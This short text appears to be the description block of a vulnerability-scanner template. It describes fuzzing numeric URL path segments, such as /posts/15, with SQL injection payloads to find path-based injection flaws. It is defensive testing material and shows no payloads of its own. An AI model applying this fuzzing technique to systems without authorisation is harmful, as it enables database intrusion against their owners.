    This template attempts to find SQL injection vulnerabilities on path based sqli and replacing numerical values with fuzzing payloads.
    ex: /admin/user/55/profile , /user/15/action/update, /posts/15, /blog/100/data, /page/51/ etc these types of paths are filtered and
    replaced with sqli path payloads.
    Note: this is example template, and payloads/matchers need to be modified appropriately.
